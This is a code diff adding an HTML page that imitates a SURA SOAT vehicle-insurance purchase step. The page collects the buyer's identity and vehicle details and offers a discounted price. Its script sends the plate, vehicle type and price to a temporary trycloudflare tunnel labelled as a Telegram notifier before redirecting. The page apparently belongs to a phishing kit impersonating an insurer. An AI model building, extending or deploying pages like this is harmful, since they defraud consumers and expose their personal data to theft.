@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Datos - SOAT</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', Arial, sans-serif;
+      background: #f5f7fb;
+      font-size: 16px;
+    }
+
+    /* ============ HEADER SURA (igual) ============ */
+    .soat-header {
+      background: #ffffff;
+      border-bottom: 1px solid #e6e6e6;
+      height: 80px;
+      display: flex;
+      align-items: center;
+    }
+    .soat-header-container {
+      max-width: 1360px;
+      margin: 0 auto;
+      padding: 2px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .soat-logo {
+      display: flex;
+      align-items: center;
+      margin-left: -640px;
+    }
+    .soat-logo img {
+      max-height: 220px;
+      width: auto;
+      object-fit: contain;
+      margin-left: -100px;
+    }
+    .soat-steps {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      font-size: 15px;
+      font-weight: 500;
+      margin-right: -560px;
+    }
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #0097A9;
+      font-size: 19px;
+      font-weight: 800;
+    }
+    .step-number {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      background: #e5e7eb;
+      color: #0097A9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 21px;
+      font-weight: 600;
+    }
+    .step.completed {
+      color: #2563eb;
+    }
+    .step.completed .step-number {
+      background: #2563eb;
+      color: #ffffff;
+      font-size: 19px;
+    }
+    .step.active {
+      color: #2563eb;
+      font-weight: 700;
+    }
+    .step.active .step-number {
+      background: #2563eb;
+      color: #ffffff;
+    }
+
+    /* ============ LAYOUT CUERPO ============ */
+    .datos-layout {
+      max-width: 1360px;
+      margin: 32px auto 52px;
+      padding: 0 40px;
+      display: grid;
+      grid-template-columns: 340px minmax(0, 1.7fr) 380px;
+      gap: 36px;
+      align-items: flex-start;
+    }
+
+    /* ============ CARD INFORMACIÓN VEHÍCULO ============ */
+    .card-vehiculo {
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 20px 22px;
+      border: 1px solid #d1d5db;
+      font-size: 15px;
+    }
+    .card-vehiculo h2 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #374151;
+      margin: 0 0 12px 0;
+      border-bottom: 1px solid #e5e7eb;
+      padding-bottom: 6px;
+    }
+    .card-vehiculo .fila {
+      margin-bottom: 4px;
+      line-height: 1.5;
+    }
+    .card-vehiculo .label {
+      display: inline-block;
+      font-weight: 600;
+      color: #4b5563;
+      min-width: 200px;
+    }
+    .card-vehiculo .valor {
+      color: #111827;
+      font-weight: 500;
+    }
+
+    /* ============ COLUMNA CENTRAL (formulario) ============ */
+    .col-tomador {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+    }
+    .titulo-tomador {
+      font-size: 22px;
+      font-weight: 700;
+      color: #1f2933;
+      margin-bottom: 4px;
+    }
+    .sublinea-tomador {
+      width: 260px;
+      height: 2px;
+      background: #2f6bff;
+      margin-bottom: 10px;
+    }
+    .form-tomador {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 14px;
+    }
+    .campo {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+    .campo label {
+      font-size: 15px;
+      color: #4b5563;
+      font-weight: 500;
+    }
+    .campo input,
+    .campo select {
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: 1px solid #d1d5db;
+      font-size: 15px;
+      box-sizing: border-box;
+      background: #ffffff;
+    }
+
+    /* ============ COLUMNA DERECHA (valor a pagar) ============ */
+    .card-valor {
+      background: #ffffff;
+      border-radius: 10px;
+      padding: 20px 24px;
+      border: 1px solid #d1d5db;
+      font-size: 15px;
+    }
+    .card-valor h3 {
+      font-size: 16px;
+      font-weight: 700;
+      color: #374151;
+      margin: 0 0 8px 0;
+    }
+    .card-valor .monto {
+      font-size: 26px;
+      font-weight: 700;
+      color: #111827;
+      margin: 0 0 10px 0;
+      text-align: right;
+    }
+    .card-valor .nota {
+      font-size: 13px;
+      color: #6b7280;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+    .card-valor .btn-comprar {
+      margin-top: 24px;
+      width: 100%;
+      background: #e4eb22;
+      color: #003a99;
+      border: none;
+      border-radius: 999px;
+      padding: 17px 0;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    /* ============ RESPONSIVE ============ */
+
+    /* Tablet / pantallas medianas */
+    @media (max-width: 1024px) {
+      .soat-header-container {
+        padding: 4px 20px;
+      }
+
+      .soat-logo {
+        margin-left: 0;
+      }
+
+      .soat-logo img {
+        max-height: 140px;
+        margin-left: 0;
+      }
+
+      .soat-steps {
+        margin-right: 0;
+        gap: 16px;
+        font-size: 14px;
+      }
+
+      .datos-layout {
+        padding: 0 20px;
+        grid-template-columns: 320px minmax(0, 1.6fr);
+        grid-template-rows: auto auto;
+        grid-template-areas:
+          "vehiculo tomador"
+          "valor    tomador";
+      }
+
+      .card-vehiculo {
+        grid-area: vehiculo;
+      }
+
+      .col-tomador {
+        grid-area: tomador;
+      }
+
+      .card-valor {
+        grid-area: valor;
+      }
+    }
+
+    /* Móvil: todo en una columna, header más compacto */
+    @media (max-width: 768px) {
+      .soat-header {
+        height: auto;
+      }
+
+      .soat-header-container {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 10px;
+      }
+
+      .soat-logo {
+        margin-left: 0;
+      }
+
+      .soat-logo img {
+        max-height: 90px;
+      }
+
+      .soat-steps {
+        flex-wrap: wrap;
+        margin-right: 0;
+        gap: 10px 16px;
+        font-size: 13px;
+      }
+
+      .step {
+        font-size: 14px;
+      }
+
+      .step-number {
+        width: 28px;
+        height: 28px;
+        font-size: 16px;
+      }
+
+      .datos-layout {
+        margin: 20px auto 36px;
+        padding: 0 12px;
+        grid-template-columns: 1fr;
+        grid-template-areas:
+          "vehiculo"
+          "tomador"
+          "valor";
+        gap: 20px;
+      }
+
+      .card-vehiculo,
+      .card-valor {
+        font-size: 14px;
+        padding: 16px 16px;
+      }
+
+      .card-vehiculo .label {
+        min-width: 0;
+        display: block;
+      }
+
+      .card-vehiculo .fila {
+        margin-bottom: 8px;
+      }
+
+      .titulo-tomador {
+        font-size: 20px;
+      }
+
+      .sublinea-tomador {
+        width: 200px;
+      }
+
+      .card-valor .monto {
+        font-size: 22px;
+        text-align: left;
+      }
+
+      .card-valor .btn-comprar {
+        font-size: 16px;
+        padding: 14px 0;
+      }
+    }
+
+    /* Móviles pequeños */
+    @media (max-width: 480px) {
+      .soat-steps {
+        justify-content: flex-start;
+      }
+
+      .step span:last-child {
+        font-size: 12px;
+      }
+
+      .datos-layout {
+        padding: 0 10px;
+      }
+
+      .campo label {
+        font-size: 14px;
+      }
+
+      .campo input,
+      .campo select {
+        font-size: 14px;
+        padding: 10px 12px;
+      }
+    }
+
+    @media (max-width: 960px) {
+      .datos-layout {
+        grid-template-columns: 1fr;
+        padding: 0 16px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header class="soat-header">
+    <div class="soat-header-container">
+      <div class="soat-logo">
+        <img src="suraenlinea.png" alt="SURA en línea">
+      </div>
+
+      <div class="soat-steps">
+        <div class="step completed">
+          <span class="step-number">✓</span>
+          <span>Cotización</span>
+        </div>
+        <div class="step active">
+          <span class="step-number">2</span>
+          <span>Datos</span>
+        </div>
+        <div class="step">
+          <span class="step-number">3</span>
+          <span>Validación</span>
+        </div>
+        <div class="step">
+          <span class="step-number">4</span>
+          <span>Pago</span>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- CUERPO -->
+  <main class="datos-layout">
+    <!-- Información del vehículo -->
+    <section class="card-vehiculo">
+      <h2>Información del vehículo</h2>
+
+      <div class="fila">
+        <span class="label">Placa:</span>
+        <span class="valor" id="info-placa">---</span>
+      </div>
+      <div class="fila">
+        <span class="label">Tipo de vehículo:</span>
+        <span class="valor" id="info-tipo">---</span>
+      </div>
+      <div class="fila">
+        <span class="label">Marca:</span>
+        <span class="valor" id="info-marca">---</span>
+      </div>
+      <div class="fila">
+        <span class="label">Modelo:</span>
+        <span class="valor" id="info-modelo">---</span>
+      </div>
+      <div class="fila">
+        <span class="label">Tipo servicio/carrocería:</span>
+        <span class="valor" id="info-servicio">---</span>
+      </div>
+      <div class="fila">
+        <span class="label">Clase:</span>
+        <span class="valor" id="info-clase">---</span>
+      </div>
+      <div class="fila">
+        <span class="label">Cilindraje/potencia:</span>
+        <span class="valor" id="info-cilindraje">---</span>
+      </div>
+    </section>
+
+    <!-- Datos del tomador -->
+    <section class="col-tomador">
+      <div>
+        <div class="titulo-tomador">Datos del tomador</div>
+        <div class="sublinea-tomador"></div>
+      </div>
+
+      <form class="form-tomador" onsubmit="return false;">
+        <div class="campo">
+          <label>Fecha inicio de vigencia del SOAT</label>
+          <input type="date" id="fechaVigencia">
+        </div>
+
+        <div class="campo">
+          <label>Tipo de identificación</label>
+          <select id="tipoId">
+            <option value="">Selecciona...</option>
+            <option value="C">Cédula de ciudadanía</option>
+            <option value="N">NIT</option>
+          </select>
+        </div>
+
+        <div class="campo">
+          <label>Número de identificación</label>
+          <input type="text" id="numeroId">
+        </div>
+
+        <div class="campo">
+          <label>Nombres</label>
+          <input type="text" id="nombres">
+        </div>
+
+        <div class="campo">
+          <label>Apellidos</label>
+          <input type="text" id="apellidos">
+        </div>
+
+        <div class="campo">
+          <label>Fecha de expedición del documento</label>
+          <input type="date" id="fechaExpDoc">
+        </div>
+
+        <div class="campo">
+          <label>Tipo de vehículo</label>
+          <select id="tipoVehiculo">
+            <option value="">Selecciona...</option>
+            <option value="carro">Carro</option>
+            <option value="moto">Moto</option>
+          </select>
+        </div>
+
+        <div class="campo">
+          <label>Marca del vehículo</label>
+          <select id="inputMarca"></select>
+        </div>
+
+        <div class="campo">
+          <label>Modelo</label>
+          <input type="text" id="inputModelo">
+        </div>
+
+        <div class="campo">
+          <label>Tipo servicio / carrocería</label>
+          <input type="text" id="inputServicio">
+        </div>
+
+        <div class="campo">
+          <label>Clase</label>
+          <input type="text" id="inputClase">
+        </div>
+
+        <div class="campo">
+          <label>Cilindraje / potencia</label>
+          <input type="text" id="inputCilindraje">
+        </div>
+      </form>
+    </section>
+
+    <!-- Valor a pagar -->
+    <aside class="card-valor">
+      <h3>Valor a pagar:</h3>
+      <p class="monto" id="valorPagar">$0</p>
+      <p class="nota">
+        *Este es un valor aproximado. Antes de que pagues, verás el costo real del SOAT.
+      </p>
+
+      <button type="button" class="btn-comprar">Comprar</button>
+    </aside>
+  </main>
+
+  <script>
+    // Placa desde consultar.html
+        const API_BASE = "https://detroit-supplements-firewall-kinase.trycloudflare.com";
+
+    const params = new URLSearchParams(window.location.search);
+    const placa = (params.get('placa') || '').toUpperCase();
+    if (placa) {
+      document.getElementById('info-placa').textContent = placa;
+    }
+
+    // Marcas Colombia
+    const marcasCarro = [
+      'Chevrolet','Renault','Mazda','Kia','Toyota',
+      'Hyundai','Nissan','Volkswagen','Suzuki','BYD'
+    ];
+    const marcasMoto = [
+      'Yamaha','Bajaj','AKT','Suzuki','Honda',
+      'Victory','TVS','Hero','Kymco','KTM'
+    ];
+
+    const tipoVehiculoSelect = document.getElementById('tipoVehiculo');
+    const marcaSelect = document.getElementById('inputMarca');
+    const montoSpan = document.getElementById('valorPagar');
+
+    function cargarMarcas(tipo) {
+      marcaSelect.innerHTML = '';
+      const placeholder = document.createElement('option');
+      placeholder.value = '';
+      placeholder.textContent = 'Selecciona marca...';
+      marcaSelect.appendChild(placeholder);
+
+      const lista = tipo === 'moto' ? marcasMoto : marcasCarro;
+      lista.forEach(m => {
+        const opt = document.createElement('option');
+        opt.value = m;
+        opt.textContent = m;
+        marcaSelect.appendChild(opt);
+      });
+    }
+
+    function actualizarPrecio() {
+      const tipo = tipoVehiculoSelect.value;
+      let valor = 0;
+      if (tipo === 'moto') {
+        valor = 256000 * 0.5;   // 50% de 256.000
+      } else if (tipo === 'carro') {
+        valor = 300000;
+      }
+      if (valor > 0) {
+        montoSpan.textContent = '$' + valor.toLocaleString('es-CO');
+      } else {
+        montoSpan.textContent = '$0';
+      }
+      return valor;
+    }
+
+    function bindField(inputId, spanId) {
+      const input = document.getElementById(inputId);
+      const span  = document.getElementById(spanId);
+      if (!input || !span) return;
+      const update = () => {
+        span.textContent = input.value.trim() || '---';
+      };
+      input.addEventListener('input', update);
+      update();
+    }
+
+    // Vincular campos a ficha
+    bindField('inputModelo',     'info-modelo');
+    bindField('inputServicio',   'info-servicio');
+    bindField('inputClase',      'info-clase');
+    bindField('inputCilindraje', 'info-cilindraje');
+
+    tipoVehiculoSelect.addEventListener('change', () => {
+      const tipo = tipoVehiculoSelect.value;
+      document.getElementById('info-tipo').textContent = tipo ? tipo.toUpperCase() : '---';
+      if (tipo) cargarMarcas(tipo);
+      actualizarPrecio();
+    });
+
+    marcaSelect.addEventListener('change', () => {
+      document.getElementById('info-marca').textContent =
+        marcaSelect.value || '---';
+    });
+
+    // Inicial
+    cargarMarcas('carro');
+
+    // Botón Comprar -> notificar al backend (Telegram) y luego ir a tratado.html
+    const btnComprar = document.querySelector('.btn-comprar');
+
+    btnComprar.addEventListener('click', async () => {
+      const tipo = document.getElementById('tipoVehiculo').value || '';
+      const valor = actualizarPrecio();
+
+      try {
+await fetch(`${API_BASE}/api/telegram-notify`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            placa: placa,
+            tipoVehiculo: tipo,
+            valor: valor
+          })
+        });
+      } catch (e) {
+        console.error(e);
+        // alert opcional
+        // alert('No se pudo notificar al bot de Telegram.');
+      }
+
+      window.location.href = `tratado.html?placa=${encodeURIComponent(placa)}&valor=${encodeURIComponent(valor)}`;
+    });
+  </script>
+</body>
+</html>
